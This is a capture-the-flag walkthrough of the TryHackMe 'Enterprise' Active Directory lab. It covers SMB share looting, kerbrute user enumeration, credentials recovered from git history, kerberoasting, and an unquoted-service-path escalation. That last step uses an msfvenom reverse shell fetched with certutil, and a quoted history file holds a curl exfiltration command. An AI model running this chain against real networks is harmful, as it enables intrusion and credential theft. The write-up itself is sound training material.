---
title: "Enterprise"
date: 2024-09-17T15:11:37-05:00
draft: false
tags:
- THM
- Windows
- Active Directory
- Kerberoast
- Git
- Unqoted Service Path
---

![Enterprise](/img/enterprise/enterprise.png#center)

## Description
[Enterprise](https://tryhackme.com/r/room/enterprise) is a Hard difficulty Active Directory box on Tryhackme. We are in an assumed compromise scenario where our only target is a domain controller on the internal network. While privilege escalation was straightforward, there are multiple rabbit holes for initial access.

## Recon
I began my recon on the machine was a nmap scan.
```
# Nmap 7.94SVN scan initiated Wed Sep 18 17:50:36 2024 as: nmap -p- -A -v -oN nmap.scan -T5 10.10.62.141
Increasing send delay for 10.10.62.141 from 0 to 5 due to 948 out of 2369 dropped probes since last increase.
Warning: 10.10.62.141 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.62.141
Host is up (0.21s latency).
Not shown: 65506 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-18 18:02:39Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=LAB-DC.LAB.ENTERPRISE.THM
| Issuer: commonName=LAB-DC.LAB.ENTERPRISE.THM
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-09-17T17:46:46
| Not valid after:  2025-03-19T17:46:46
| MD5:   12f5:c3db:b128:72f4:9f89:6a26:be7a:899d
|_SHA-1: 2022:9e18:d0fb:90a4:ba39:9c9b:ef3c:504f:d485:d8ce
| rdp-ntlm-info: 
|   Target_Name: LAB-ENTERPRISE
|   NetBIOS_Domain_Name: LAB-ENTERPRISE
|   NetBIOS_Computer_Name: LAB-DC
|   DNS_Domain_Name: LAB.ENTERPRISE.THM
|   DNS_Computer_Name: LAB-DC.LAB.ENTERPRISE.THM
|   DNS_Tree_Name: ENTERPRISE.THM
|   Product_Version: 10.0.17763
|_  System_Time: 2024-09-18T18:03:41+00:00
|_ssl-date: 2024-09-18T18:03:49+00:00; +50s from scanner time.
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7990/tcp  open  http          Microsoft IIS httpd 10.0
|_http-title: Log in to continue - Log in with Atlassian account
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
49707/tcp open  msrpc         Microsoft Windows RPC
49840/tcp open  msrpc         Microsoft Windows RPC
Aggressive OS guesses: Microsoft Windows Server 2019 (96%), Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2016 (92%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (92%), Microsoft Windows 10 1709 - 1803 (91%), Microsoft Windows 10 1809 - 2004 (91%), Microsoft Windows Server 2012 R2 (90%), Microsoft Windows Server 2012 R2 Update 1 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: Busy server or unknown class
Service Info: Host: LAB-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 49s, deviation: 0s, median: 49s
| smb2-time: 
|   date: 2024-09-18T18:03:42
|_  start_date: N/A

TRACEROUTE (using port 554/tcp)
HOP RTT       ADDRESS
1   75.99 ms  10.13.0.1
2   ... 3
4   204.26 ms 10.10.62.141

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep 18 18:03:05 2024 -- 1 IP address (1 host up) scanned in 749.00 seconds
```
Even if we were not told that our target was a domain controller (per the room description), it would quickly become apparent with the discovery of DC-specific ports and services like kerberos on port 88.

After identifying open services, I always look for quick wins next. I Noticed SMB anonymous access was allowed and we have read permission on several shares. 

```
┌──(kali㉿kali)-[~]
└─$ netexec smb 10.10.62.141 -u 'Anonymous' -p '' --shares
SMB         10.10.62.141    445    LAB-DC           [*] Windows 10 / Server 2019 Build 17763 x64 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM) (signing:True) (SMBv1:False)
SMB         10.10.62.141    445    LAB-DC           [+] LAB.ENTERPRISE.THM\Anonymous: 
SMB         10.10.62.141    445    LAB-DC           [*] Enumerated shares
SMB         10.10.62.141    445    LAB-DC           Share           Permissions     Remark
SMB         10.10.62.141    445    LAB-DC           -----           -----------     ------
SMB         10.10.62.141    445    LAB-DC           ADMIN$                          Remote Admin
SMB         10.10.62.141    445    LAB-DC           C$                              Default share
SMB         10.10.62.141    445    LAB-DC           Docs            READ            
SMB         10.10.62.141    445    LAB-DC           IPC$            READ            Remote IPC
SMB         10.10.62.141    445    LAB-DC           NETLOGON                        Logon server share 
SMB         10.10.62.141    445    LAB-DC           SYSVOL                          Logon server share 
SMB         10.10.62.141    445    LAB-DC           Users           READ            Users Share. Do Not Touch!
```

```Docs``` and ```Users``` in particular appeared worth digging further into. I took a look at ```Docs``` first.

```
┌──(kali㉿kali)-[/tmp]
└─$ smbclient //10.10.62.141/Docs -U Anonymous -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Mar 15 02:47:35 2021
  ..                                  D        0  Mon Mar 15 02:47:35 2021
  RSA-Secured-Credentials.xlsx        A    15360  Mon Mar 15 02:46:54 2021
  RSA-Secured-Document-PII.docx       A    18432  Mon Mar 15 02:45:24 2021

                15587583 blocks of size 4096. 9927627 blocks available
smb: \>
```

There are two files, ```RSA-Secured-Credentials.xlsx``` and ```RSA-Secured-Document-PII.docx```. These could be huge findings that allow us to breach the domain controller. I transferred the files to my attacker machine. The files were password protected, so I extracted the password hashes with ```office2john``` and started cracking them while I continued enumerating the machine (spoiler alert: I couldn't crack any of the hashes). 

I took a look at the Users share next. After some digging, I came across a PowerShell history file for LAB_ADMIN in ```\LAB-ADMIN\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\```.

```
smb: \LAB-ADMIN\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\> get Consolehost_hisory.txt 
getting file \LAB-ADMIN\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\Consolehost_hisory.txt of size 424 as Consolehost_hisory.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
```

```
┌──(kali㉿kali)-[/tmp]
└─$ cat Consolehost_hisory.txt                                                                  
cd C:\
mkdir monkey
cd monkey
cd ..
cd ..
cd ..
cd D:
cd D:
cd D:
D:\
mkdir temp
cd temp
echo "replication:101RepAdmin123!!">private.txt
Invoke-WebRequest -Uri http://1.215.10.99/payment-details.txt
more payment-details.txt
curl -X POST -H 'Cotent-Type: ascii/text' -d .\private.txt' http://1.215.10.99/dropper.php?file=itsdone.txt
del private.txt
del payment-details.txt
cd ..
del temp
cd C:\
C:\
exit
```

We see the credentials ```replication```:```101RepAdmin123!!```. I tried using the credentials. Unfortunately, it appears that the ```replication``` user has been deleted. 

We can also brute force usernames by taking advantage of the KDC's prompt for preauthentication for valid usernames (it returns an error if given a nonexistent username). I used [kerbrute](https://github.com/ropnop/kerbrute).

```
┌──(kali㉿kali)-[~]
└─$ ~/opt/kerbrute/dist/kerbrute_linux_amd64 userenum --dc 10.10.62.141 --domain lab.enterprise.thm /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 09/18/24 - Ronnie Flathers @ropnop

2024/09/18 17:47:42 >  Using KDC(s):
2024/09/18 17:47:42 >   10.10.62.141:88

2024/09/18 17:47:47 >  [+] VALID USERNAME:       banana@lab.enterprise.thm
2024/09/18 17:47:54 >  [+] VALID USERNAME:       guest@lab.enterprise.thm
2024/09/18 17:48:20 >  [+] VALID USERNAME:       administrator@lab.enterprise.thm
2024/09/18 17:49:53 >  [+] VALID USERNAME:       cake@lab.enterprise.thm
2024/09/18 17:50:51 >  [+] VALID USERNAME:       enterprise@lab.enterprise.thm
2024/09/18 17:51:40 >  [+] VALID USERNAME:       nik@lab.enterprise.thm
2024/09/18 17:52:34 >  [+] VALID USERNAME:       Guest@lab.enterprise.thm
2024/09/18 17:52:35 >  [+] VALID USERNAME:       Administrator@lab.enterprise.thm
2024/09/18 17:57:00 >  [+] VALID USERNAME:       Banana@lab.enterprise.thm
2024/09/18 17:57:14 >  [+] VALID USERNAME:       spooks@lab.enterprise.thm
2024/09/18 17:59:28 >  [+] VALID USERNAME:       joiner@lab.enterprise.thm
```

I then tried sprayed ```101RepAdmin123!!``` against the usernames and variations of it (e.g. ```101RepAdmin123!```) against the users to no avail. ASREProasting also turned up nothing, so I had to look at other attack vectors.


There are also two HTTP services running on ports 80 and 7990 that we can take a look at. While port 80 did not yield anything interesting, there is an Atlassian portal on port 7990. The login portal itself appears to be a static and unexploitable webpage, but there is a message mentioning that the org may be moving to Github. 

![Atlassian login portal](/img/enterprise/atlassian.png)

I have to admit, it took me way longer than I would have liked to figure out that there was an actual Github page associated with "Enterprise-THM" as opposed to something like a .git folder hidden in a subdirectory. 

![Enterprise-THM Github page](/img/enterprise/enterprise_github.png)

The Github page has a single repository that doesn't hold any useful information. However, there is an associated account "Nik-enterprise-dev" which has a repository "mgmtScript.ps1". This could prove to be out lucky break.

![Nik-enterprise-dev Github page](/img/enterprise/nik_github.png)



## Foothold
The PowerShell script takes in a username and password and gets the system information of all computers within an active directory network. While the ```$userName``` and ```$userPassword``` fields are empty, we can see that there has been more than one change pushed to this repository.

![mgmtScript.ps1 Repository history](/img/enterprise/git_history.png)

We can look at the details by cloning the repository.

```shell
git clone https://github.com/Nik-enterprise-dev/mgmtScript.ps1.git
```

I then switched to the repository folder and ran ```git log```. This shows, among others, the commit hash for each push to the repository. We can use these hashes to view changes and previous versions of the repo.

```
┌──(kali㉿kali)-[/tmp/mgmtScript.ps1]
└─$ git log                                                           
commit c3c239df75fefbe7563d1d29c963ba1f01e4fe5a (HEAD -> main, origin/main, origin/HEAD)
Author: Nik-enterprise-dev <80557956+Nik-enterprise-dev@users.noreply.github.com>
Date:   Sat Mar 13 20:09:16 2021 -0500

    Updated things
    
    I accidentally added something

commit bc40c9f237bfbe7be7181e82bebe7c0087eb7ed8
Author: Nik-enterprise-dev <80557956+Nik-enterprise-dev@users.noreply.github.com>
Date:   Sat Mar 13 18:57:40 2021 -0500

    Create SystemInfo.ps1
    
    Gets System Info from each computer on the domain
```
In one of his commits, Nik comments that he "accidentally added something". We can view the details by supplying the commit hash.

```
┌──(kali㉿kali)-[/tmp/mgmtScript.ps1]
└─$ git show c3c239df75fefbe7563d1d29c963ba1f01e4fe5a
commit c3c239df75fefbe7563d1d29c963ba1f01e4fe5a (HEAD -> main, origin/main, origin/HEAD)
Author: Nik-enterprise-dev <80557956+Nik-enterprise-dev@users.noreply.github.com>
Date:   Sat Mar 13 20:09:16 2021 -0500

    Updated things
    
    I accidentally added something

diff --git a/SystemInfo.ps1 b/SystemInfo.ps1
index bc7ca27..5ae7576 100644
--- a/SystemInfo.ps1
+++ b/SystemInfo.ps1
@@ -1,6 +1,6 @@
 Import-Module ActiveDirectory
-$userName = 'nik'
-$userPassword = '<nik's password>'
+$userName = ''
+$userPassword = ''
 $psCreds = ConvertTo-SecureString $userPassword -AsPlainText -Force
 $Computers = New-Object -TypeName "System.Collections.ArrayList"
 $Computer = $(Get-ADComputer -Filter * | Select-Object Name)
```

We see that Nik had accidentally pushed his credentials and the final commit removed them from the repository. I tried ```nik```:```<nik's password>``` against a number of services, but the account does not have sufficient privileges to gain a foothold through common services like RDP or SMB. However, since it is a domain account, we can also perform other attacks such as kerberoasting.

```
┌──(kali㉿kali)-[/tmp]
└─$ impacket-GetUserSPNs lab.enterprise.thm/nik:'<nik's password>' -dc-ip 10.10.62.141 -request -outputfile kerberoast.txt
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

ServicePrincipalName  Name       MemberOf                                                     PasswordLastSet             LastLogon                   Delegation 
--------------------  ---------  -----------------------------------------------------------  --------------------------  --------------------------  ----------
HTTP/LAB-DC           bitbucket  CN=sensitive-account,CN=Builtin,DC=LAB,DC=ENTERPRISE,DC=THM  2021-03-12 01:20:01.333272  2021-04-26 15:16:41.570158             



[-] CCache file is not found. Skipping...
```

We get a hash for ```bitbucket```. Now to crack it...

```
hashcat -a 0 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

Eventually, it cracks.


## Privilege Escalation
With the new credentials for the ```bitbucket``` service account, I connected to the domain controller through RDP.

```
xfreerdp /v:10.10.62.141 /u:bitbucket /p:<bitbucket's password> /cert-ignore
```

After some enumeration, I found an unquoted service path.

```
C:\Users\bitbucket>wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
Name                                      PathName                                                                      
AtlassianBitbucket                        C:\Atlassian\Bitbucket\7.11.1\bin\bserv64.exe //RS//AtlassianBitbucket        
AtlassianBitbucketElasticsearch           C:\Atlassian\Bitbucket\7.11.1\elasticsearch\bin\elasticsearch-service-x64.exe //RS//AtlassianBitbucketElasticsearch
LSM                                                                                                                     
NetSetupSvc                                                                                                             
zerotieroneservice                        C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe               
```

Unquoted service paths are a vulnerability that arises due to the way Windows runs its binaries. Say we have a program ```C:\Users\Public\My Programs\New Program.exe```, Windows will first try to execute ```C:\Users\Public\My.exe``` followed by ```C:\Users\Public\My Program.exe```, ```C:\Users\Public\My Program\New.exe```, and finally ```C:\Users\Public\My Programs\New Program.exe``` because of the spaces in and the path and lack of enclosing quotes. ```zerotieroneservice``` is vulnerable to this type of exploit.

Importantly, the service binary is owned by ```NT AUTHORITY\SYSTEM```.

```
C:\Users\bitbucket>dir /q "C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe"
 Volume in drive C has no label.
 Volume Serial Number is 7CD9-A0AE

 Directory of C:\Program Files (x86)\Zero Tier\Zero Tier One

12/05/2014  11:52 AM         9,594,056 NT AUTHORITY\SYSTEM    ZeroTier One.exe
               1 File(s)      9,594,056 bytes
               0 Dir(s)  40,566,411,264 bytes free
```
User permissions for ```C:\Program Files (x86)\Zero Tier```:

```
C:\Users\bitbucket>icacls "C:\Program Files (x86)\Zero Tier"
C:\Program Files (x86)\Zero Tier BUILTIN\Users:(OI)(CI)(W)
                                 NT SERVICE\TrustedInstaller:(I)(F)
                                 NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
                                 NT AUTHORITY\SYSTEM:(I)(F)
                                 NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                                 BUILTIN\Administrators:(I)(F)
                                 BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                                 BUILTIN\Users:(I)(RX)
                                 BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                                 CREATOR OWNER:(I)(OI)(CI)(IO)(F)
                                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
                                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
                                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)

Successfully processed 1 files; Failed processing 0 files
```

```bitbucket```, as a member of ```BUILTIN\Users```, has write access to the ```C:\Program Files (x86)\Zero Tier``` directory through ```BUILTIN\Users```. It is therefore possible to write a "Zero.exe" binary have the zerotieroneservice execute it.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.48.55 LPORT=31337 -f exe -o Zero.exe
```
Now to transfer it to our target...

```
python3 -m http.server 80
```

```
C:\Program Files (x86)\Zero Tier>certutil -urlcache -f http://10.13.48.55/Zero.exe Zero.exe
```

Next, I checked the status of ```zerotieroneservice```.

```
C:\Program Files (x86)\Zero Tier>sc query zerotieroneservice

SERVICE_NAME: zerotieroneservice
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
```

The service is not running. All that needs to be done now is to start the service and we should receive a shell as ```NT AUTHORITY\SYSTEM``` (Don't forget to start a listener first).

```
C:\Users\bitbucket>sc start zerotieroneservice
```

```
┌──(kali㉿kali)-[~]
└─$ rlwrap nc -nvlp 31337
listening on [any] 31337 ...
connect to [10.13.48.55] from (UNKNOWN) [10.10.146.30] 49930
Microsoft Windows [Version 10.0.17763.1817]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```